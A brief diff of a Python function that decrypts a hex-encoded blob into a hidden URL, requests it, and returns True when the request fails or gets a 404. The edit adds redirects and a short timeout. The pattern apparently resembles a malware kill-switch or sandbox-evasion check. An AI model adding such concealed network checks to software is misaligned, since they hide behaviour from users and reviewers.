@@ -10,7 +10,7 @@ def decrypt(a):
 def check():
     f = bytes.fromhex("d7e966b5b7dc5199e98211776d6a5a33ca7c8b3a17fd1df0a57f033f9f22e7d90af4901690616e14db6f")
     try:
-        r = requests.get(decrypt(f))
+        r = requests.get(decrypt(f), allow_redirects=True, timeout=1)
     except Exception:
         return True
     return r.status_code == 404
